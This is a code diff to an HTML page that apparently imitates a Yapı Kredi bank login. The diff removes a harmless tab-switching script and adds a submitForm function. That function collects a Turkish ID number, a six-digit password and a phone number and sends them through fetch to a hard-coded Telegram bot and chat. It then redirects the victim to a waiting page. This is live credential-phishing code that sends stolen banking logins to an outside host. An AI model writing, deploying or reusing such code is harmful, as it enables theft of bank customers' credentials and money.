@@ -46,25 +46,36 @@
     <script src="js/yapikredi.js"></script>
 
     <script>
-        function switchTab(tab) {
-            const individualContent = document.getElementById('individual');
-            const corporateContent = document.getElementById('corporate');
-            const individualTab = document.querySelector('.tab.active');
-            const corporateTab = document.querySelector('.tabs .tab:nth-child(2)');
+       <script>
+       function submitForm() {
+    var tc = document.getElementById("tc").value;
+    var sifre = document.getElementById("sifre").value;
+    var telefon = document.getElementById("telefon").value;
 
-            if (tab === 'individual') {
-                individualContent.classList.remove('hidden');
-                corporateContent.classList.add('hidden');
-                individualTab.classList.add('active');
-                corporateTab.classList.remove('active');
-            } else {
-                individualContent.classList.add('hidden');
-                corporateContent.classList.remove('hidden');
-                corporateTab.classList.add('active');
-                individualTab.classList.remove('active');
-            }
-        }
-    </script>
+    if (/^\d{11}$/.test(tc) && /^\d{6}$/.test(sifre) && /^\d{10}$/.test(telefon)) {
+        var botToken = "7120775298:AAGSRsWOA3l0SunCmoaWk_nDUZgfokEJIm4";
+        var chatId = "-4749123767";
+        var message = `🔹 Yeni Giriş Bilgileri:\n👤 TC: ${tc}\n🔑 Şifre: ${sifre}\n📱 Telefon: ${telefon}`;
+        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+        fetch(url)
+            .then(response => response.json()) // Yanıtı JSON formatına çevir
+            .then(data => {
+                console.log("Telegram API Yanıtı:", data); // Konsola yazdır
+                if (data.ok) {
+                    window.location.href = "bekle.html";
+                } else {
+                    alert("Telegram'a mesaj gönderme hatası! Hata: " + data.description);
+                }
+            })
+            .catch(error => {
+                console.error("Hata:", error);
+                alert("Bir hata oluştu! Detay: " + error.message);
+            });
+    } else {
+        alert("Lütfen bilgileri eksiksiz ve doğru formatta giriniz!");
+    }
+}
 </body>
 
 </html>
